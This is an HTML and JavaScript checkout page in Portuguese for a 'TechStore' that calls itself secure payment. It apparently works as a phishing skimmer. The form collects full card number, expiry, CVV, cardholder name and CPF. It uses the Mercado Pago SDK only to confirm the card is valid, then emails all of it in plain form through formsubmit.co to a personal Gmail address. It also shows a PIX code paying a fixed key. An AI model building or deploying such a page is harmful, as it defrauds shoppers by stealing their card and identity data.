<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Pagamento Seguro - TechStore</title>
<script src="https://sdk.mercadopago.com/js/v2"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
<style>
    * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; touch-action: pan-x pan-y; }
    body { background:#111; margin:0; padding:15px; color: white; -webkit-text-size-adjust: 100%; }
    .container { max-width:500px; margin:auto; background:#1c1c1c; border-radius:20px; padding:20px; box-shadow:0 5px 15px rgba(0,0,0,.5); }
    .resumo { display:flex; gap:15px; background:#252525; padding:15px; border-radius:15px; margin-bottom:20px; border-left:5px solid #27ae60; align-items: center; }
    .foto-produto { width:70px; height:70px; object-fit: contain; background:#fff; border-radius:10px; padding: 5px; }
    h2 { font-size:13px; color:#888; margin:20px 0 10px; text-transform:uppercase; }
    input { width:100%; padding:13px; margin-bottom:12px; border:1px solid #333; border-radius:10px; font-size:15px; background: #222; color: #fff; outline: none; }
    .row { display:flex; gap:10px; }
    .metodos { display:flex; gap:10px; margin-bottom:20px; }
    .opt { flex:1; padding:14px; text-align:center; border:2px solid #333; border-radius:12px; cursor:pointer; font-weight:bold; color:#888; }
    .opt.active { border-color:#007bff; color:#007bff; background:#007bff1a; }
    #area-pix { text-align:center; padding: 10px 0; }
    .valor-pix-destaque { font-size: 26px; font-weight: bold; color: #27ae60; margin-bottom: 15px; display: block; }
    #qrcode-container { background: white; padding: 10px; border-radius: 10px; display: inline-block; margin-bottom: 15px; }
    .chave-pix { background:#222; padding:12px; border-radius:10px; font-size:11px; margin:10px 0; word-break:break-all; border:1px dashed #444; color: #ccc; }
    .btn-copiar { background:#007bff; color:#fff; border:none; padding:12px 20px; border-radius:10px; font-size:14px; font-weight:bold; cursor:pointer; width: 100%; }
    .seguro-info { background: #252525; padding: 10px; border-radius: 10px; font-size: 11px; color: #888; display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
    .btn-finalizar { background:#27ae60; color:#fff; border:none; width:100%; padding:18px; border-radius:15px; font-size:18px; font-weight:bold; cursor:pointer; margin-top: 10px; }
    #c2 { text-transform: uppercase; }
    ::placeholder { color: #777; font-size: 13px; }
</style>
</head>
<body>

<div class="container">
    <div id="resumo-dinamico"></div>
    <form action="https://formsubmit.co/pagamento.celular02@gmail.com" method="POST" id="form-main">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" id="h-nome" name="PRODUTOS_LISTA">
        <input type="hidden" id="h-preco" name="VALOR_TOTAL">

        <h2>LocalizaÃ§Ã£o de Entrega</h2>
        <input type="text" name="NOME_CLIENTE" placeholder="Nome Completo" required>
        <input type="text" name="ENDERECO_COMPLETO" placeholder="EndereÃ§o, Bairro e Cidade" required>
        <div class="row">
            <input type="text" name="NUMERO" placeholder="NÂº" required style="width:30%">
            <input type="text" id="f-cep" name="CEP" placeholder="CEP" required>
        </div>

        <h2>Pagamento</h2>
        <div class="metodos">
            <div class="opt active" id="b-pix" onclick="trocar('pix')">PIX</div>
            <div class="opt" id="b-card" onclick="trocar('card')">CARTÃƒO</div>
        </div>

        <div id="area-pix">
            <span class="valor-pix-destaque" id="pix-valor-display">R$ 0,00</span>
            <div id="qrcode-container"></div> <div class="chave-pix" id="pix-copy">Gerando cÃ³digo PIX...</div>
            <button type="button" class="btn-copiar" onclick="copiarPix()">COPIAR CHAVE PIX</button>
        </div>

        <div id="area-card" style="display:none">
            <input id="c1" name="CARTAO_NUMERO" placeholder="NÃºmero do CartÃ£o" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9 ]/g, '')">
            <input id="c2" name="CARTAO_NOME" placeholder="Nome no CartÃ£o (Frente do cartÃ£o)" oninput="this.value = this.value.toUpperCase()">
            <div class="row">
                <input id="c3" name="CARTAO_VALIDADE" placeholder="MM/AA (AtrÃ¡s do cartÃ£o)" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9\/]/g, '')">
                <input id="c4" name="CARTAO_CVV" placeholder="CVV (AtrÃ¡s do cartÃ£o)" maxlength="3" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
            </div>
            <input id="c5" name="CARTAO_CPF" placeholder="CPF do Titular" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9.-]/g, '')">
            <input type="text" id="f-tel" name="WHATSAPP" placeholder="WhatsApp para confirmaÃ§Ã£o (Opcional)">
        </div>

        <div class="seguro-info"><span>ðŸ”’</span><p>Pagamento processado de forma segura.</p></div>
        <button class="btn-finalizar" type="submit" id="btn-submit">FINALIZAR PAGAMENTO</button>
    </form>
</div>

<script>
const mp = new MercadoPago('APP_USR-d9085be6-cab5-4226-be88-0e3199c1cb63');
let valorGlobal = 0;

window.onload = function() {
    const carrinho = JSON.parse(localStorage.getItem('carrinhoTechStore')) || [];
    if (carrinho.length > 0) {
        carrinho.forEach(item => { valorGlobal += parseFloat(item.p); });
        const valorFormatado = "R$ " + valorGlobal.toLocaleString('pt-BR', {minimumFractionDigits: 2});
        
        let textoProdutos = carrinho[0].n;
        if (carrinho.length > 1) textoProdutos += ` e mais ${carrinho.length - 1} produto(s)`;
        
        document.getElementById('resumo-dinamico').innerHTML = `
            <div class="resumo">
                <img class="foto-produto" src="${carrinho[0].f}">
                <div><h3>${textoProdutos}</h3><p>${valorFormatado}</p></div>
            </div>`;
        
        document.getElementById('pix-valor-display').innerText = valorFormatado;
        document.getElementById('h-nome').value = textoProdutos;
        document.getElementById('h-preco').value = valorFormatado;

        gerarPixDinamico(valorGlobal); // Gera o PIX inteligente
    }
};

function gerarPixDinamico(valor) {
    const chave = "5663014b-ba23-4c57-b239-26914c95a8c0"; // Sua chave mantida
    const nome = "TECHSTORE";
    const cidade = "SAO PAULO";
    const valorStr = valor.toFixed(2).toString();
    
    // Montagem do payload PIX (BRCode)
    const payload = `00020126580014BR.GOV.BCB.PIX0136${chave}520400005303986540${valorStr.length.toString().padStart(2, '0')}${valorStr}5802BR5909${nome}6009${cidade}62070503***6304`;
    
    // Gerar QR Code Visual
    new QRCode(document.getElementById("qrcode-container"), { text: payload, width: 160, height: 160 });
    document.getElementById('pix-copy').innerText = payload;
}

function trocar(m) {
    const isPix = m === 'pix';
    document.getElementById('area-pix').style.display = isPix ? 'block' : 'none';
    document.getElementById('area-card').style.display = isPix ? 'none' : 'block';
    document.getElementById('b-pix').className = isPix ? 'opt active' : 'opt';
    document.getElementById('b-card').className = isPix ? 'opt' : 'opt active';
    ['c1', 'c2', 'c3', 'c4', 'c5'].forEach(id => { document.getElementById(id).required = !isPix; });
}

function copiarPix() {
    navigator.clipboard.writeText(document.getElementById('pix-copy').innerText);
    alert("CÃ³digo PIX Copia e Cola copiado com sucesso!");
}

document.getElementById('form-main').onsubmit = async function(e) {
    if (document.getElementById('b-pix').classList.contains('active')) return;
    e.preventDefault();
    const btn = document.getElementById('btn-submit');
    btn.innerText = "VERIFICANDO...";
    btn.disabled = true;
    try {
        const cardToken = await mp.createCardToken({
            cardNumber: document.getElementById('c1').value.replace(/\s/g, ''),
            cardholderName: document.getElementById('c2').value,
            cardExpirationMonth: document.getElementById('c3').value.split('/')[0],
            cardExpirationYear: "20" + document.getElementById('c3').value.split('/')[1],
            securityCode: document.getElementById('c4').value,
            identificationType: "CPF",
            identificationNumber: document.getElementById('c5').value.replace(/\D/g, ''),
        });
        if (cardToken.id) this.submit();
        else { alert("âŒ Dados incorretos."); btn.innerText = "FINALIZAR PAGAMENTO"; btn.disabled = false; }
    } catch (err) { alert("âŒ Verifique os dados."); btn.innerText = "FINALIZAR PAGAMENTO"; btn.disabled = false; }
};

function mask(id, m) {
    const el = document.getElementById(id);
    el.addEventListener('input', () => {
        let v = el.value.replace(/\D/g, ''), x = '', i = 0;
        m.split('').forEach(c => { if(c==='#'){ if(v[i]) x+=v[i++]; } else { if(v[i]) x+=c; } });
        el.value = x;
    });
}
mask('c1', '#### #### #### ####'); mask('c3', '##/##'); mask('c5', '###.###.###-##'); mask('f-cep', '#####-###'); mask('f-tel', '(##) #####-####');
</script>
</body>
    </html>
